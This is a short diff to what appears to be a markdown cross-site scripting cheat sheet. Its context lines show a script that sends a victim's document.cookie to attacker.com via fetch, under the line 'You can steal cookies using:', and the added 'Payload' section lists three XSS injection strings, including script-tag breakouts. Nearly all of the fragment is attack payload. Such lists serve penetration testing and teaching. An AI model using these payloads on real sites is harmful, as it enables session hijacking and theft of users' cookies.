@@ -167,3 +167,9 @@ You can steal cookies using:
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
 </script>
 ```
+### Payload
+```
+alert(document.domain);
+"><script>alert(1)</script>
+"/> <script>alert("XSS")</script>
+```
